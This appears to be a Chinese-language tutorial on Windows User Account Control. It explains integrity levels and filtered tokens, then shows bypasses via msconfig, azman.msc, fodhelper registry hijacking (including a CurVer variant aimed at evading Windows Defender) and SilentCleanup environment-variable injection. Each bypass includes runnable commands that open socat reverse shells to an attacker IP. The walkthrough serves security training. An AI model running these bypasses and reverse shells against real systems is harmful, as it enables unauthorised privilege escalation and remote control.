#### 概述：什么是 UAC？ (Overview: What is UAC?)

**用户账户控制 (User Account Control, UAC)** 是 Windows 操作系统的一项核心安全功能，旨在通过强制要求任何新启动的进程默认在非特权账户的安全上下文中运行，来限制恶意软件的潜在危害和意外的系统更改。这项策略适用于由任何用户（包括管理员组的成员）启动的进程。其核心理念是，不能仅仅依据用户的身份来自动授予所有操作的最高权限，而是需要对可能影响系统状态的操作进行显式授权。

##### 1. UAC 提升权限 (UAC Elevation Process)

如果管理员账户确实需要执行需要更高权限的特权任务（例如，修改系统设置、安装软件），UAC 提供了一种**提升权限 (Elevation)** 的机制。此机制通常通过向用户显示一个交互式对话框（UAC 提示框）来实现，要求用户明确批准以管理员的安全上下文（即高权限）来运行该应用程序或任务。

##### 2. 完整性级别 (Integrity Levels - IL)

UAC 是**强制完整性控制 (Mandatory Integrity Control, MIC)** 机制在 Windows 中的一种体现。MIC 通过为系统中的每个用户、进程和可安全对象（如文件、注册表键）分配一个**完整性级别 (Integrity Level, IL)** 来区分它们。通常情况下，具有较高 IL 的访问令牌的用户或进程能够访问（写入或修改）具有较低或相同 IL 的资源。MIC 的访问控制规则优先于常规的 Windows 自主访问控制列表 (Discretionary Access Control Lists, DACLs)。因此，即使一个进程根据其 DACL 被授权访问某个资源，但如果其 IL 不足以满足目标资源的最低 IL 要求，访问仍可能被拒绝。

Windows 定义了以下四个主要的完整性级别，按从低到高的顺序列出：

|   |   |
|---|---|
|**完整性级别 (Integrity Level)**|**描述 (Description)**|
|**Low (低)**|通常用于与互联网交互的进程（例如，某些浏览器沙盒模式下的标签页进程）。权限非常有限，例如不能修改大多数文件系统位置或注册表键。|
|**Medium (中等)**|分配给标准用户启动的所有进程，以及管理员用户在 UAC 启用时通过其“过滤令牌”启动的非提升权限进程。这是大多数应用程序运行的默认级别。|
|**High (高)**|在 UAC 启用的情况下，由管理员用户通过 UAC 提示明确提升权限后运行的进程所使用的级别。如果 UAC 被禁用，管理员组成员启动的所有进程将始终使用高 IL 令牌运行。|
|**System (系统)**|保留给操作系统核心组件和服务使用，如 `NT AUTHORITY\SYSTEM` 账户运行的进程。拥有系统中最高的权限级别。|

当一个进程需要访问某个资源时，它会继承其调用用户的访问令牌及其关联的 IL。如果该进程创建子进程，子进程通常也会继承父进程的 IL（除非有特殊机制改变它）。

##### 3. 过滤后的令牌 (Filtered Tokens)

为了实现标准操作权限与管理员权限的分离，UAC 对普通用户和管理员用户在登录时的处理方式略有不同：

- 非管理员用户 (Non-Administrators):
    
    登录时获得一个标准的访问令牌，该令牌用于用户执行的所有任务。此令牌具有中等 (Medium) IL。
    
- 管理员用户 (Administrators Group Members):
    
    当 UAC 启用时，管理员用户在登录后会获得两个访问令牌：
    
    1. **过滤后的令牌 (Filtered Token)**: 这是一个被移除了管理员组权限（以及其他一些高权限特权）的访问令牌，用于执行常规的、非特权的操作（例如，浏览文件、运行普通应用程序）。此令牌具有**中等 (Medium) IL**。用户的大部分日常操作都是在此令牌下运行的。
    2. **提升令牌 (Elevated Token / Full Admin Token)**: 这是一个具有完整管理员权限（包括所有管理员组特权）的访问令牌，仅在用户通过 UAC 提示明确请求并批准管理员权限后，用于运行需要管理员权限的任务。此令牌具有**高 (High) IL**。

因此，即使是管理员，在 UAC 启用时，默认情况下也是使用其过滤后的、权限较低的中等 IL 令牌进行操作，除非他们通过 UAC 流程显式请求管理员权限。

通过 Process Hacker 观察令牌完整性级别:

如果分别以普通用户方式和“以管理员身份运行”方式打开同一个应用程序（例如命令提示符 cmd.exe），然后使用 Process Hacker 或类似工具检查这两个进程：

- 普通方式启动的 `cmd.exe` 进程，其访问令牌的完整性级别将显示为“Medium”。
- “以管理员身份运行”启动的 `cmd.exe` 进程（经过 UAC 提示后），其访问令牌的完整性级别将显示为“High”。 一个不那么明显的区别是，中等 IL 的进程实际上被有效拒绝了任何与其所属的 Administrators 组成员身份相关的权限（这些权限在过滤令牌中已被移除或禁用）。

##### 4. UAC 设置 (UAC Settings)

UAC 可以通过控制面板配置为四个不同的通知级别，以适应不同的安全需求：

1. **始终通知 (Always notify me when)**:
    
    - 当用户更改 Windows 设置时，或当程序尝试安装应用程序或对计算机进行更改时，都会通知用户并要求授权。
    - UAC 提示会在**安全桌面 (Secure Desktop)** 上显示。
2. **仅在程序尝试更改我的计算机时通知我 (Notify me only when programs try to make changes to my computer - 默认设置)**:
    
    - 当程序尝试安装应用程序或对计算机进行更改时，会通知用户并要求授权。
    - 管理员用户在更改 Windows 设置时**不会**收到 UAC 提示。
    - UAC 提示会在安全桌面上显示。
3. **仅在我计算机尝试更改时通知我（不暗淡桌面）(Notify me only when programs try to make changes to my computer (do not dim my desktop))**:
    
    - 与上一级别类似，但在程序尝试更改时通知用户。
    - UAC 提示**不会**在安全桌面上运行，而是在当前用户的桌面上显示。这略微降低了安全性，因为恶意软件理论上可能干扰非安全桌面上的提示。
4. **从不通知 (Never notify me when)**:
    
    - 完全禁用 UAC 提示。
    - 管理员用户将始终以其完整的、高权限的管理员令牌运行所有程序，没有权限分离。
    - **不推荐**，因为它显著降低了系统的安全性。

从攻击者的角度来看，除了“始终通知”级别对某些绕过技术可能构成更大障碍外，其他三个较低的安全级别在很多情况下是等效的，因为它们都允许某些类型的自动提升或不提示管理员更改设置。

##### 5. UAC 内部机制 (UAC Internals)

UAC 功能的核心是**应用程序信息服务 (Application Information Service, Appinfo)**。当用户或应用程序需要提升权限时，大致会发生以下情况：

1. 用户（或代表用户的应用程序）请求以管理员身份运行某个应用程序。这通常是通过右键菜单选择“以管理员身份运行”，或者应用程序清单 (Manifest) 文件中声明了需要管理员权限。
2. Shell (例如 Explorer.exe) 会调用 `ShellExecuteEx` API，并指定 `runas` 操作（verb），表示请求提升权限。
3. `ShellExecuteEx` 的请求被转发到 Appinfo 服务以处理权限提升。
4. Appinfo 服务会检查应用程序的清单文件，查看其中是否有 `autoElevate` 标志或 `requestedExecutionLevel` 设置为 `requireAdministrator`。某些受信任的系统程序可能允许自动提升。
5. 如果需要用户交互（即不是自动提升），Appinfo 服务会执行 `consent.exe`。`consent.exe` 负责在**安全桌面 (Secure Desktop)** 上显示 UAC 提示对话框。安全桌面是一个独立的、受保护的桌面环境，与用户当前活动的桌面隔离，旨在防止其他进程（尤其是恶意软件）通过模拟用户输入或截取屏幕等方式干扰 UAC 提示或窃取凭据。
6. 如果用户在 UAC 提示中同意以管理员身份运行该应用程序（例如，点击“是”并可能输入凭据），Appinfo 服务将使用该用户的**提升令牌 (Elevated Token)** 来创建并执行所请求的新进程。
7. 然后，Appinfo 服务通常会将这个新创建的高权限进程的父进程 ID (PPID) 设置为最初请求提升权限的 Shell 进程（例如 Explorer.exe）的 ID，而不是 Appinfo 服务自身的 PID。

---

#### 绕过 UAC (Bypassing UAC)

从攻击者的角度来看，即使通过某种方式（例如，利用漏洞、社工）在 Windows 主机上获得了一个远程 Shell（如 PowerShell 或 cmd.exe 会话），并且这个 Shell 是在一个属于本地 Administrators 组成员的用户账户下运行的，由于 UAC 的存在，这个 Shell 默认情况下仍然是以该用户的**过滤令牌 (Filtered Token)** 运行的，即中等完整性级别。

这意味着，当尝试执行需要管理员权限的敏感操作时（例如，添加新用户、修改系统服务、写入受保护的注册表项），即使理论上该用户拥有这些权限，操作也会失败并提示“访问被拒绝” (Access is denied) 或类似的错误。

PowerShell

```
PS C:\Users\attacker> net user backdoor Backd00r /add
System error 5 has occurred.

Access is denied.
```

因此，如果攻击者的目标是完全控制目标系统，就必须找到一种方法来**绕过 UAC**，以便能够以高完整性级别执行命令。

##### 1. 微软对 UAC 绕过的立场 (Microsoft's Stance on UAC Bypasses)

微软官方并不认为 UAC 是一个严格意义上的**安全边界 (Security Boundary)**，而更多地将其视为一种“便利性”功能，旨在帮助管理员避免不必要地以完整管理员权限运行所有进程，从而减少意外操作或被低权限恶意软件利用的风险。从这个角度来看，UAC 提示更像是一个提醒用户“你正在以高权限运行此程序，请确认”的警告，而不是一个旨在完全阻止所有恶意软件或攻击者获取高权限的坚不可摧的屏障。

由于这种定位，许多被发现的 UAC 绕过技术（尤其是那些利用了“按设计”行为或配置缺陷的技术）并不被微软视为需要紧急修复的“漏洞”。因此，一些已知的绕过方法可能在多个 Windows 版本中长期有效。

##### 2. UAC 绕过的一般原理 (General Principle of UAC Bypasses)

大多数 UAC 绕过技术的核心原理是找到一种方法，利用一个**已经以高完整性级别 (High IL) 运行的进程**，或者一个**被允许自动提升 (Auto-Elevate) 到高 IL 的进程**，来替攻击者执行恶意操作或启动一个新的高权限 Shell。由于任何由高 IL 父进程创建的子进程通常会继承相同的完整性级别，这就足以让攻击者获得一个具有完整管理员权限的提升令牌，而无需通过用户交互的 UAC 提示。

##### 3. 基于 GUI 的绕过技术 (GUI-based Bypasses)

这些方法通常需要攻击者能够与目标系统的图形用户界面进行交互（例如，通过 RDP 会话）。

- **利用 `msconfig.exe` (系统配置实用程序)**
    
    1. **自动提升**: 在默认的 UAC 设置下，`msconfig.exe` 是一个可以自动提升权限（无需用户交互显示 UAC 提示）的系统程序。
    2. **启动 Shell**: 打开 `msconfig.exe` (例如，从“运行”对话框输入 `msconfig`)。导航到其“工具 (Tools)”选项卡。此选项卡下会列出多种系统工具及其启动命令。选择一个可以启动命令提示符的工具（例如，“命令提示符”自身），然后点击“启动 (Launch)”按钮。
    3. **结果**: 由于 `msconfig.exe` 是以高 IL 运行的，它启动的任何子进程（如此处启动的 `cmd.exe`）也将继承这个高 IL。这样，攻击者就获得了一个高权限的命令提示符，而无需经过 UAC 提示。
- **利用 `azman.msc` (授权管理器控制台)**
    
    1. **自动提升**: 与 `msconfig.exe` 类似，`azman.msc` (以及许多其他 `.msc` 文件，因为它们由 `mmc.exe` Microsoft Management Console宿主进程运行，而 `mmc.exe` 针对某些受信任的插件可以自动提升) 在默认 UAC 设置下通常也能自动提升权限。
    2. **无内置 Shell 启动**: `azman.msc` 本身没有像 `msconfig` 那样直接提供启动命令提示符的预设选项。
    3. **利用帮助功能**:
        - 运行 `azman.msc`。
        - 在授权管理器窗口中，点击菜单栏的“帮助 (Help)”，然后选择一个帮助主题（例如，“授权管理器概述”）。
        - 在打开的帮助查看器窗口中，右键点击帮助文章的任何文本部分，并选择“查看源文件 (View Source)”。
        - 这将启动记事本 (`notepad.exe`) 来显示该帮助页面的 HTML 源代码。由于帮助查看器进程（通常是 `HelpPane.exe` 或相关组件）可能是从高 IL 的 `mmc.exe` 启动的，或者自身有特定权限，其子进程 `notepad.exe` 也可能以较高权限运行（这一点需要具体验证，但思路是利用链式启动）。
        - 在记事本中，转到“文件 (File)” -> “打开 (Open...)”。在文件打开对话框中，将文件类型从“文本文档 (*.txt)”更改为“所有文件 (*.*)”。
        - 导航到 `C:\Windows\System32\` 目录，找到 `cmd.exe`。
        - 右键点击 `cmd.exe` 并选择“打开 (Open)”。
    4. **结果**: 如果此路径上的权限继承有效，新启动的 `cmd.exe` 进程将以高完整性级别运行，从而绕过 UAC 提示。

##### 4. 自动提升的进程与 Fodhelper 漏洞 (Auto-Elevating Processes and the Fodhelper Exploit)

- 自动提升的条件:
    
    某些特定的 Windows 可执行文件被设计为可以在满足特定条件时自动提升权限，而无需用户交互。这些条件通常包括：
    
    1. 可执行文件必须由 **Windows 发布者 (Windows Publisher)** 进行数字签名。
    2. 可执行文件必须位于一个**受信任的目录 (Trusted Directory)** 中，例如 `%SystemRoot%\System32\` 或 `%ProgramFiles%` (及其子目录)。
    3. 对于 `.exe` 文件，其**应用程序清单 (Application Manifest)** 文件中必须显式声明了 `<autoElevate>true</autoElevate>` 元素。可以使用 Sysinternals 套件中的 `sigcheck.exe` 工具来查看文件的清单 (例如，`sigcheck64.exe -m c:\windows\system32\msconfig.exe`)。
    4. 对于 `.msc` 文件，它们由 `mmc.exe` (Microsoft Management Console) 宿主。`mmc.exe` 会根据用户请求加载的 `.msc` 插件（如果该插件来自受信任来源且设计为需要提升）来自动提升权限。
    5. Windows 还维护一个额外的、未在清单中声明但仍会自动提升的可执行文件列表，例如 `pkgmgr.exe` (程序包管理器) 和 `spinstall.exe` (系统策略安装程序) 等。
    6. 某些 **COM 对象**也可以通过在注册表中配置特定的键值来请求自动提升权限。
- 利用 fodhelper.exe:
    
    fodhelper.exe 是 Windows 中负责管理“按需功能 (Features on Demand)”（如附加语言包、可选应用程序等）的默认可执行程序。与大多数用于系统配置的程序类似，在默认的 UAC 设置下，fodhelper.exe 可以自动提升权限。与 msconfig.exe 不同的是，fodhelper.exe 可以在没有 GUI 访问权限的情况下被滥用，这意味着它可以通过一个中等完整性的远程 Shell (如 PowerShell 或 cmd) 来利用，以获得一个功能齐全的高完整性进程。
    
    漏洞原理:
    
    当 fodhelper.exe 执行时，它会尝试打开与 ms-settings: URI 方案关联的程序。Windows 在打开文件或 URI 时，会检查注册表以确定使用哪个应用程序。注册表为每种文件类型或 URI 方案保存一个名为“程序标识符 (ProgID)”的键，其中关联了相应的处理应用程序及其命令行。
    
    关键在于，Windows 在查找 ProgID 关联时，会优先检查当前用户的注册表配置单元 `HKEY_CURRENT_USER\Software\Classes` (HKCU)，如果找不到用户特定的关联，才会去查找全局的机器级关联 `HKEY_LOCAL_MACHINE\Software\Classes` (HKLM)。(`HKEY_CLASSES_ROOT` 或 HKCR 实际上是 HKCU 和 HKLM 中 `Software\Classes` 的合并视图)。
    
    攻击者可以利用这一点：
    
    1. 在 `HKCU\Software\Classes\` 下为 `ms-settings` ProgID (具体路径是 `ms-settings\shell\open\command`) 创建一个自定义的命令关联。
    2. 由于 HKCU 的优先级更高，当 `fodhelper.exe` (一个自动提升的进程) 尝试打开 `ms-settings:` 时，它会执行攻击者在 HKCU 中指定的命令。
    3. 因为 `fodhelper.exe` 是以高 IL 运行的，它创建的任何子进程（即攻击者指定的命令）也将继承高 IL，从而有效绕过 UAC。
    4. 为了使自定义命令关联生效，通常需要在 `HKCU\Software\Classes\ms-settings\shell\open\command` 键下创建一个名为 `DelegateExecute` 的空字符串值 (REG_SZ)。如果此值不存在，操作系统可能会忽略用户自定义的命令，转而使用全局关联。
    
    示例 (使用 reg add 设置注册表键以获取反向 Shell):
    
    假设已获得中等权限的 cmd Shell，攻击者 IP 为 <attacker_ip>，监听端口为 4444。
    
    DOS
    
    ```
    set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
    set CMD_PAYLOAD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
    reg add %REG_KEY% /v "DelegateExecute" /d "" /f
    reg add %REG_KEY% /ve /d %CMD_PAYLOAD% /f  REM /ve sets the (Default) value
    ```
    
    在攻击机上设置 Netcat 监听器：
    
    Bash
    
    ```
    nc -lvnp 4444
    ```
    
    然后，在目标机器的中等权限 Shell 中执行：
    
    DOS
    
    ```
    fodhelper.exe
    ```
    
    这将触发在 HKCU 中设置的 `CMD_PAYLOAD`，从而在高权限下执行 `socat.exe` 并建立反向 Shell。
    
    **清理痕迹**:
    
    DOS
    
    ```
    reg delete HKCU\Software\Classes\ms-settings /f
    ```
    
- 改进 Fodhelper 漏洞以尝试规避 Windows Defender:
    
    Windows Defender 或其他 AV/EDR 产品可能会监控对敏感注册表项（如与 ms-settings 关联的命令）的修改。当检测到恶意命令被写入时，它可能会立即删除该注册表值或发出警报。
    
    1. 竞争条件 (Race Condition) 利用尝试:
        
        一种思路是利用 Defender 采取行动所需的时间差。在设置恶意注册表值后，立即执行 fodhelper.exe。
        
        DOS
        
        ```
        reg add %REG_KEY% /ve /d %CMD_PAYLOAD% /f & fodhelper.exe
        ```
        
        如果 `fodhelper.exe` 在 Defender 删除注册表值之前就读取并执行了它，那么绕过可能成功。但这通常不稳定。
        
    2. 使用 CurVer (当前版本) 注册表项进行改进:
        
        这种技术更为隐蔽。当系统查找 ProgID 时，如果该 ProgID 下存在一个 CurVer 子键，系统会使用 CurVer 子键的默认值作为新的 ProgID 去查找命令。
        
        - **步骤**:
            1. 创建一个全新的、任意名称的 ProgID (例如，`.pwn` 或 `.thm`)。在其下创建 `Shell\Open\command` 子键结构，并将恶意载荷命令设置为这个新 ProgID 的默认打开命令。同时确保 `DelegateExecute` 也存在。
            2. 在 `HKCU\Software\Classes\ms-settings\` 下创建一个名为 `CurVer` 的子键。
            3. 将 `HKCU\Software\Classes\ms-settings\CurVer` 的默认值设置为指向你新创建的 ProgID 的名称 (例如，`.pwn`)。
        - **PowerShell 示例**:
            
            PowerShell
            
            ```
            $program = "powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
            New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force
            Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(Default)" -Value $program -Force
            Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force # 确保 DelegateExecute
            
            New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force
            Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(Default)" -Value ".pwn" -Force
            
            Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
            ```
            
        - 当 `fodhelper.exe` 尝试使用 `ms-settings` ProgID 打开文件时，它会发现 `CurVer` 指向 `.pwn`，于是转而使用 `.pwn` ProgID 关联的命令，从而执行恶意载荷。
        - 这种技术更可能绕过某些基于特定 ProgID 名称 (如 `ms-settings`) 的简单检测规则，因为包含实际载荷的 ProgID 名称是攻击者任意选择的。
        - **注意**: 即使如此，如果载荷本身（例如，PowerShell 执行 `socat`）的行为被 Defender 识别为恶意，仍然可能触发警报。有时，将 PowerShell 载荷转换为等效的 `cmd.exe` 命令可能会有不同的检测结果。
            
            DOS
            
            ```
            set CMD_PAYLOAD="cmd.exe /c C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
            reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /ve /d %CMD_PAYLOAD% /f
            reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /v "DelegateExecute" /d "" /f
            reg add "HKCU\Software\Classes\ms-settings\CurVer" /ve /d ".thm" /f
            fodhelper.exe
            ```
            
        - **清理痕迹 (CurVer 方法)**:
            
            DOS
            
            ```
            reg delete "HKCU\Software\Classes\.thm" /f
            reg delete "HKCU\Software\Classes\ms-settings" /f
            ```
            

##### 5. 利用环境变量扩展与计划任务 (Environment Variable Expansion with Scheduled Tasks)

在 UAC 设置为最高级别“始终通知”时，像 `fodhelper.exe` 这样的自动提升程序也可能无法在不显示 UAC 提示的情况下提升权限。此时，可以尝试利用某些配置特殊的计划任务。

- 原理:
    
    一些内置的计划任务被配置为以调用用户的“最高可用权限 (highest available privileges)”运行，并且允许“按需运行 (run on demand)”。如果这些任务在执行命令时使用了可被用户级注册表覆盖的环境变量 (如 %windir%)，攻击者就有机会通过修改这些环境变量来注入并执行自己的命令。由于计划任务通常设计为无需用户交互即可运行（即使是需要提升权限的任务），它们会自动获取高 IL 令牌（如果调用者是管理员），而无需通过 UAC 提示。
    
- 利用磁盘清理 (Disk Cleanup) 计划任务:
    
    计划任务路径：\Microsoft\Windows\DiskCleanup\SilentCleanup
    
    1. **任务配置**:
        - 通常配置为使用当前登录用户账户运行。
        - 勾选了“使用最高权限运行 (Run with highest privileges)”选项。这意味着如果管理员调用此任务，它将以高 IL 令牌执行。如果普通非管理员用户调用，则仅以中等 IL 执行，绕过将无效。
        - 允许按需运行 (“Allow task to be run on demand”)。
    2. **执行的命令**: `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
    3. **漏洞点**: 命令中的 `%windir%` 环境变量可以被用户通过在 `HKCU\Environment` 注册表项下创建同名值来覆盖。
    4. **注入与执行**:
        - 将 `HKCU\Environment` 中的 `windir` 值设置为恶意命令，例如： `cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM` 注意末尾的 `&REM` (REM 后有一个空格)，这是为了将原始命令中 `%windir%` 之后的部分（即 `\system32\cleanmgr.exe ...`）注释掉，防止其执行或产生语法错误。 最终在计划任务执行时，扩展后的命令将变成： `cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%` `REM` 之后的所有内容都被视为注释而被忽略。
        - **示例命令**: 在攻击机上监听：
            
            Bash
            
            ```
            nc -lvnp 4446
            ```
            
            在目标机器的中等权限 Shell 中执行：
            
            DOS
            
            ```
            reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
            schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
            ```
            
            执行 `schtasks /run` 后，应能收到高权限的反向 Shell。
    5. **清理痕迹**:
        
        DOS
        
        ```
        reg delete "HKCU\Environment" /v "windir" /f
        ```
        

---

#### 自动化 UAC 绕过利用 (Automated UAC Bypass Exploitation)

存在一些工具可以用于测试和执行已知的 UAC 绕过技术。

- **UACME (UACMe)**:
    - GitHub 地址: `https://github.com/hfiref0x/UACME`
    - UACME 是一个包含多种已知 UAC 绕过方法实现的开源项目。它提供了多个可执行工具，其中 `Akagi.exe` (或其变体，名称可能随版本变化) 负责执行实际的 UAC 绕过。
    - **使用方法**: 通常很简单，运行 `Akagi.exe` 并提供一个数字参数，该数字对应项目文档中列出的特定绕过方法的编号。
    - 这是一个研究和测试 UAC 机制的优秀工具，但不应直接用于未经授权的活动。